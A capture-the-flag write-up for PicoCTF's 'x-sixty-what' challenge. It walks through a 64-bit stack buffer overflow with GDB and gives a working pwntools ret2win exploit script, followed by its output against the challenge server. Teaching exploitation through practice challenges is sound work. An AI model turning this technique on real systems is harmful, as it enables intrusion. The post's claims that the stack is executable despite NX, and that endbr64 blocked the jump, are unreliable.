---
layout: single
title:  "PicoCTF 2022 - x-sixty-what"
categories: 
  - PicoCTF
  - Binary Exploitation
tags:
  - ctf
  - picoctf
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: "Another ret2win challenge. Interestingly, this deals with 64-bit binaries instead of 32-bit."
---

Another ret2win challenge. Interestingly, this deals with 64-bit binaries instead of 32-bit.

## My Solution
Let's take a look at the `vuln` binary. Using `file` and `checksec`, we observe the following:
```bash
$ file vuln
>> vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=8ba2226f06946bc75922ba6fb1919e6283162f22, for GNU/Linux 3.2.0, not stripped

$ checksec vuln                                                                     
[*] '.../vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
From this, we can observe that the file:
- is a 64-bit ELF file,
- is not stripped,
- has no PIE, and
- has very little protection in place (stack is executable, no stack canary).

Now, looking at `vuln.c`, we can note down some interesting features.
```c
...
#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```
We can see that the provided file has a read buffer size of 64, and has a `flag()` function present. Like most binary exploitation challenges, the vulnerable `gets()` function is used here to retrieve user input. 

It appears that nothing is out of the ordinary here. We just need to note that this is a 64-bit binary, and we need to return to the `flag()` function to get our flag.

Now, let's use GDB to find the function addresses, and to determine the offset to RIP (not EIP, as this is a 64-bit binary).
```bash
$ gdb vuln
>> ...
gef➤ info functions
...
0x0000000000401236  flag
0x00000000004012b2  vuln
0x00000000004012d2  main
...
```
We observe that the address of `flag()` is `0x0000000000401236`.
```bash
gef➤ pattern create 150
[+] Generating a pattern of 150 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: .../vuln
Welcome to 64-bit. Give me a string that gets you the flag:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012d1 in vuln ()
```
As expected, we receive a segmentation fault. To determine where our RIP offset is, let's look at the stack.
```bash
0x00007fffffffd658│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"    ← $rsp
0x00007fffffffd660│+0x0008: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"
...
```
Notice that the pattern "jaaaaaaaka..." is found at the top of the stack. If this value was a valid memory address, then it should be popped from the stack and passed to RIP. Therefore, the offset to RIP will also be the offset to RSP, as RSP points to this pattern.
```bash
pattern offset $rsp
[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
[+] Found at offset 72 (little-endian search) likely
```
Thus, we have determined our offset to be 72 bytes. Additionally, we notice something interesting in the debugger. It appeared that the RIP doesn't get clobbered in this case, which is unlike what we've seen in 32-bit binaries.
```bash
$rip   : 0x00000000004012d1  →  <vuln+31> ret
```
Normally, we would've expected to see a bunch of 61s here. The reason for this is due to **canonical addressing** in x64 systems. Simply put, canonical addresses fall within a specific address size range. Addresses outside of this size range would be considered non-canonical, and will never be pushed into RIP. In this case, the maximum address size is 48 bits in length (or, 6 bytes). For us to control RIP, we will need to mask off the 2 most significant bytes from the 8 byte memory address of our `flag()` function.

To check this, let's generate a pattern of 78 bytes in length, and observe if RIP was clobbered.
```bash
gef➤  pattern create 78
[+] Generating a pattern of 78 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaa
[+] Saved as '$_gef5'
gef➤  r
Starting program: .../vuln
Welcome to 64-bit. Give me a string that gets you the flag:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x000061616161616a in ?? ()
...
$rip   : 0x61616161616a
```
Indeed, our RIP was clobbered with exactly 6 bytes of data.

We can now proceed to solve this challenge. Using Python 3 and pwntools:
```python
# solve.py

from pwn import *
# elf = ELF('./vuln') # for local execution
# p = process(elf.path) # for local execution
p = remote('saturn.picoctf.net', 49395) # for remote execution

# payload buffer
payload = b'A' * 72 # RIP offset
payload += p64(0x401236) # 0x0000000000401236

print(p.recvuntil(':'))
p.sendline(payload)
p.interactive()
```
However, in spite of the correct approach taken, this solution did not work, as I unexpectedly received a segmentation fault. If we refer to the challenge page on PicoCTF, we notice that this disclaimer was provided:
`Reminder: local exploits may not always work the same way remotely due to differences between machines.`

It appeared that entering the exact address of `flag()` does not work on all machines (explanation below!). To solve this challenge, I had to enter the address of a move instruction within the function instead.
`0x000000000040123b <+5>:     mov    rbp,rsp`

Making modifications to the Python script, we can now get the flag.
```python
...
payload = b'A' * 72 # RIP offset
payload += p64(0x40123b)
...
```
```bash
[+] Opening connection to saturn.picoctf.net on port 49395: Done
solve.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(p.recvuntil(':'))
b'Welcome to 64-bit. Give me a string that gets you the flag:'
[*] Switching to interactive mode

picoCTF{b1663r_15_b3773r_3e77a3f1}[*] Got EOF while reading in interactive
$
[*] Closed connection to saturn.picoctf.net port 49395
```

## Learning Takeaways
### Why did the program fail to call `flag()` when we loaded the address of flag into the payload?
Let's disassemble `flag()`.
```bash
gef➤  disas flag
Dump of assembler code for function flag:
0x0000000000401236 <+0>:     endbr64
0x000000000040123a <+4>:     push   rbp
0x000000000040123b <+5>:     mov    rbp,rsp
0x000000000040123e <+8>:     sub    rsp,0x50
...
```
We notice that the function address points to a `endbr64` instruction. After doing some brief research, it seems that this is a form of ROP protection on Intel-based chips. In short, the presence of this instruction prevents attackers (like us) from directly manipulating return addresses of functions on the call stack, thus preventing us from calling `flag()`. 

To bypass this, we made the program jump to an instruction within `flag()` instead. There was some trial and error involved, but it seemed like jumping to the move instruction was the right approach.

Generally, we've learnt that x64 systems behave differently from x32. For instance, 32-bit systems can read off the stack directly, while 64-bit systems refer to registers on the stack, which makes manipulation of the call stack a bit more challenging. There's also the concept of canonical addresses which was mentioned above.

## References
- [John Hammond (YouTube): x64 ret2win - LINUX Buffer Overflow (PicoCTF 2022 #41 'x-sixty-what')](https://www.youtube.com/watch?v=eg0gULifHFI&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=42)
- [64-bit Stack-based Buffer Overflow](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow)
- [Exploiting Calling Conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
